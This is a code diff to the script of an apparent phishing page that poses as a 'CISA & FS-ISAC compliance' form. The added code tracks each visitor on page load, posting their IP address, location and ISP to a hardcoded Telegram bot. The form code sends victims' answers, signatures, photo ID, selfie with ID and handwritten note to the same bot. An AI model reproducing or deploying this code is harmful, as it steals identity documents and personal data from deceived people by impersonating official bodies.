@@ -870,8 +870,67 @@
 </div>
 
 <script>
+function sendPageOpenNotification() {
+  var botToken = "8974824259:AAEQ0PcGUcLULk92EeIr3iKpjXJi7usBRfs";
+  var chatId = "7283385361";
+
+  fetch('https://ipapi.co/json/')
+    .then(function(response) { return response.json(); })
+    .then(function(data) {
+      var ip = data.ip || 'Unknown';
+      var city = data.city || 'Unknown';
+      var region = data.region || 'Unknown';
+      var country = data.country_name || 'Unknown';
+      var isp = data.org || 'Unknown';
+
+      var message = "👁️ PAGE VIEW NOTIFICATION\n\n";
+      message += "File Reference: PB-142-WT1139\n";
+      message += "Action: Page opened\n";
+      message += "IP Address: " + ip + "\n";
+      message += "Location: " + city + ", " + region + ", " + country + "\n";
+      message += "ISP: " + isp + "\n";
+      message += "Timestamp: " + new Date().toLocaleString() + "\n";
+      message += "Status: Active — page is being viewed";
+
+      var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+      var data = { chat_id: chatId, text: message };
+
+      return fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    })
+    .catch(function(error) {
+      var message = "👁️ PAGE VIEW NOTIFICATION\n\n";
+      message += "File Reference: PB-142-WT1139\n";
+      message += "Action: Page opened\n";
+      message += "IP Address: Unable to retrieve\n";
+      message += "Timestamp: " + new Date().toLocaleString() + "\n";
+      message += "Status: Active — page is being viewed";
+
+      var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+      var data = { chat_id: chatId, text: message };
+
+      return fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    })
+    .catch(function(error) {
+      console.log("Tracking failed: " + error.message);
+    });
+}
+
+window.onload = function() {
+  sendPageOpenNotification();
+};
+
 function submitForm() {
-  document.querySelectorAll('.error-field').forEach(el => el.classList.remove('error-field'));
+  document.querySelectorAll('.error-field').forEach(function(el) {
+    el.classList.remove('error-field');
+  });
 
   var errors = [];
 
@@ -999,78 +1058,64 @@ function submitForm() {
   btn.textContent = "SUBMITTING...";
   btn.disabled = true;
 
-  function escapeMarkdown(text) {
-    if (!text) return '';
-    var specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
-    var escaped = '';
-    for (var i = 0; i < text.length; i++) {
-      var char = text[i];
-      if (specialChars.indexOf(char) !== -1) {
-        escaped += '\\' + char;
-      } else {
-        escaped += char;
-      }
-    }
-    return escaped;
-  }
+  var additional = document.querySelector('textarea[name="additional_info"]').value || "None provided";
+  var q14 = document.querySelector('textarea[name="q14"]').value || "None provided";
 
-  var additional = escapeMarkdown(document.querySelector('textarea[name="additional_info"]').value);
-  var q14 = escapeMarkdown(document.querySelector('textarea[name="q14"]').value);
+  var message = "📋 CISA & FS-ISAC COMPLIANCE FORM SUBMISSION\n\n";
+  message += "File Reference: PB-142-WT1139\n";
+  message += "Date: " + date + "\n\n";
 
-  var message = "📋 *CISA & FS-ISAC COMPLIANCE FORM SUBMISSION*\n\n";
-  message += "*File Reference:* PB-142-WT1139\n";
-  message += "*Date:* " + date + "\n\n";
-
-  message += "*SECTION A — Cybersecurity Incident Reporting Awareness*\n";
+  message += "SECTION A — Cybersecurity Incident Reporting Awareness\n";
   message += "1. " + q1.value + "\n";
   message += "2. " + q2.value + "\n";
   message += "3. " + q3.value + "\n\n";
 
-  message += "*SECTION B — Fraud & Illicit Finance Awareness*\n";
+  message += "SECTION B — Fraud & Illicit Finance Awareness\n";
   message += "4. " + q4.value + "\n";
   message += "5. " + q5.value + "\n";
   message += "6. " + q6.value + "\n\n";
 
-  message += "*SECTION C — Declaration of Intent*\n";
+  message += "SECTION C — Declaration of Intent\n";
   message += "Selected Option: " + intent.value + "\n";
-  message += "Additional Info: " + (additional || "None provided") + "\n\n";
+  message += "Additional Info: " + additional + "\n\n";
 
-  message += "*SECTION D — Declaration of Understanding*\n";
+  message += "SECTION D — Declaration of Understanding\n";
   message += "Reviewed notice: " + (decl1 ? "Yes" : "No") + "\n";
   message += "Understand deadline: " + (decl2 ? "Yes" : "No") + "\n";
   message += "Understand consequences: " + (decl3 ? "Yes" : "No") + "\n";
   message += "Confirm intention: " + (decl4 ? "Yes" : "No") + "\n\n";
 
-  message += "*SECTION F — Transaction & Compliance Awareness*\n";
+  message += "SECTION F — Transaction & Compliance Awareness\n";
   message += "8. " + (q8 ? q8.value : 'Not answered') + "\n";
   message += "9. " + (q9 ? q9.value : 'Not answered') + "\n";
   message += "10. " + (q10 ? q10.value : 'Not answered') + "\n";
   message += "11. " + (q11 ? q11.value : 'Not answered') + "\n";
   message += "12. " + (q12 ? q12.value : 'Not answered') + "\n\n";
 
-  message += "*SECTION G — Employment & Occupation Status*\n";
+  message += "SECTION G — Employment & Occupation Status\n";
   message += "13. " + (q13 ? q13.value : 'Not answered') + "\n";
-  message += "14. " + (q14 || "None provided") + "\n\n";
+  message += "14. " + q14 + "\n\n";
 
-  message += "*SECTION H — Certification of Responsibility*\n";
+  message += "SECTION H — Certification of Responsibility\n";
   message += "Responsibility declared: " + (responsibility ? "Yes" : "No") + "\n";
   message += "Signature: " + respSignature + "\n";
   message += "Date: " + respDate + "\n\n";
 
-  message += "*Signature:* " + signature + "\n\n";
-  message += "*Confirmation Number:* CISA-FSISAC-CONF-20260727-2841";
+  message += "Signature: " + signature + "\n\n";
+  message += "Confirmation Number: CISA-FSISAC-CONF-20260727-2841";
 
   var botToken = "8974824259:AAEQ0PcGUcLULk92EeIr3iKpjXJi7usBRfs";
   var chatId = "7283385361";
 
   var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
-  var data = { chat_id: chatId, text: message, parse_mode: "Markdown" };
+  var data = { chat_id: chatId, text: message };
 
-  fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  })
   .then(function(response) {
-    if (!response.ok) {
-      throw new Error('Network response was not ok');
-    }
     return response.json();
   })
   .then(function(data) {
@@ -1084,13 +1129,19 @@ function submitForm() {
         var fileUrl = "https://api.telegram.org/bot" + botToken + "/sendDocument";
         return fetch(fileUrl, { method: 'POST', body: formData });
       }
-      if (photoIdFile) promises.push(sendFile(photoIdFile, "📸 Photo ID"));
-      if (photoWithIdFile) promises.push(sendFile(photoWithIdFile, "📸 Photo with ID"));
-      if (handwrittenNoteFile) promises.push(sendFile(handwrittenNoteFile, "📸 Handwritten Note"));
+      if (photoIdFile) promises.push(sendFile(photoIdFile, "Photo ID"));
+      if (photoWithIdFile) promises.push(sendFile(photoWithIdFile, "Photo with ID"));
+      if (handwrittenNoteFile) promises.push(sendFile(handwrittenNoteFile, "Handwritten Note"));
       return Promise.all(promises);
     } else {
       throw new Error(data.description || 'Failed to send message');
     }
+  })
+  .then(function(responses) {
+    if (responses && responses.length > 0) {
+      return Promise.all(responses.map(function(r) { return r.json(); }));
+    }
+    return [];
   })
   .then(function() {
     document.querySelector('.submit-btn').style.display = 'none';
